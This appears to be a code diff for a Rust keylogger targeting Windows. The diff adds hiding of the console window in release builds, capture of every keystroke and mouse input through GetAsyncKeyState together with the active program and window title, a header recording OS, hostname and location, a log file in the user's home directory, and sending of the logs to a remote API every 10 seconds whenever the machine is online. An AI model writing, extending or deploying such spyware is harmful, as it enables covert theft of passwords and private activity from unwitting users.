@@ -1,23 +1,22 @@
-//#![windows_subsystem = "windows"]
+#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
 
 #[cfg(windows)]
 extern crate winapi;
 
 use chrono::{DateTime, Timelike, Utc};
-use info::{LogFile, log, send_header_data, send_info_data};
+use info::{log, log_header, send_info_data, LogFile};
 use std::sync::Arc;
 
-use tokio::{
-    fs::{OpenOptions},
-    sync::Mutex,
-    task,
-};
+use directories::UserDirs;
+use online::*;
+use tokio::{fs::OpenOptions, sync::Mutex, task};
 
 mod info;
 
+static TIMEOUT: i64 = 10;
 
 #[cfg(windows)]
-fn run(log_file: Arc<Mutex<LogFile>>) {
+async fn run(log_file: Arc<Mutex<LogFile>>) {
     use std::{thread, time::Duration};
     use winapi::ctypes::c_int;
     use winapi::shared::minwindef::DWORD;
@@ -26,18 +25,23 @@ fn run(log_file: Arc<Mutex<LogFile>>) {
     use winapi::um::winnt::PROCESS_QUERY_LIMITED_INFORMATION;
     use winapi::um::winuser::*;
 
-    task::spawn(send_header_data(log_file.clone()));
+    //log the metadata in the file (OS, hostname and location)
+    task::spawn(log_header(log_file.clone()));
     let mut last = chrono::offset::Utc::now();
+    let client = reqwest::Client::new();
 
     loop {
+        //sleep the thread for 10 milliseconds
         thread::sleep(Duration::from_millis(10));
 
+        //each 10 seconds send the logs to the API if the computer is connected to internet
         let aux = chrono::offset::Utc::now() - last;
-        if aux.num_seconds() > 10 {
-            task::spawn(send_info_data(log_file.clone()));
+        if aux.num_seconds() > TIMEOUT && online(None).await.unwrap() {
+            task::spawn(send_info_data(log_file.clone(), client.clone()));
             last = chrono::offset::Utc::now();
         }
 
+        //get the process handler to use the windows API
         let hwnd = unsafe { GetForegroundWindow() };
 
         let pid = unsafe {
@@ -48,6 +52,7 @@ fn run(log_file: Arc<Mutex<LogFile>>) {
 
         let handle = unsafe { OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, pid) };
 
+        //get the current file or programsname
         let filename = unsafe {
             const LEN: u32 = 256;
             let mut buf = vec![0 as u16; LEN as usize];
@@ -64,6 +69,7 @@ fn run(log_file: Arc<Mutex<LogFile>>) {
             String::from_utf16_lossy(buf[0..len].as_mut())
         };
 
+        //get the current file or program windows title
         let title = unsafe {
             let len = GetWindowTextLengthW(hwnd) + 1;
             let mut t = String::from("__NO_TITLE__");
@@ -74,15 +80,17 @@ fn run(log_file: Arc<Mutex<LogFile>>) {
                 buf.remove(buf.len() - 1);
                 t = String::from_utf16_lossy(buf.as_mut());
             }
-
             t
         };
 
+        // Get the current datetime
         let now: DateTime<Utc> = Utc::now();
 
         for i in 0 as c_int..255 as c_int {
+            //Check each input (keyboard and mouse) state
             let key = unsafe { GetAsyncKeyState(i) };
 
+            // If there is an input active, log it.
             if (key & 1) > 0 {
                 let s = format!(
                     "[{:02}:{:02}:{:02}][{}][{}][{}]\n",
@@ -94,14 +102,14 @@ fn run(log_file: Arc<Mutex<LogFile>>) {
                     keycode_to_string(i as u8)
                 );
 
+                //log the data in a concurrent thread
                 task::spawn(log(log_file.clone(), s));
             }
         }
     }
 }
 
-
-
+//Map the input description from it's hexadecimal representation
 fn keycode_to_string(k: u8) -> String {
     if (k >= 65 && k <= 90) || (k >= 48 && k <= 57) {
         return format!("{}", (k as char));
@@ -280,6 +288,7 @@ fn run(file: &mut File) {
 #[tokio::main]
 async fn main() -> tokio::io::Result<()> {
     let now: DateTime<Utc> = Utc::now();
+
     let filename = format!(
         "log-{}-{:02}+{:02}+{:02}",
         now.date(),
@@ -288,17 +297,29 @@ async fn main() -> tokio::io::Result<()> {
         now.second()
     );
 
-    println!("{}", filename);
+    let mut aux = format!("{}.log", &filename);
+    let mut path = std::path::Path::new(aux.as_str());
 
+    if let Some(user_dirs) = UserDirs::new() {
+        path = match user_dirs.home_dir().to_str() {
+            Some(value) => {
+                aux = format!("{}/{}.log", value, filename);
+                std::path::Path::new(aux.as_str())
+            }
+            None => path,
+        };
+    }
+
+    // We create a file in which the logs will be store
     let file = OpenOptions::new()
         .read(true)
         .write(true)
         .create(true)
-        .open(format!("{}.log", &filename))
+        .open(path)
         .await?;
 
     let log_file = Arc::new(Mutex::new(LogFile::new(filename, file)));
-    run(log_file);
+    run(log_file).await;
 
     return Ok(());
 }
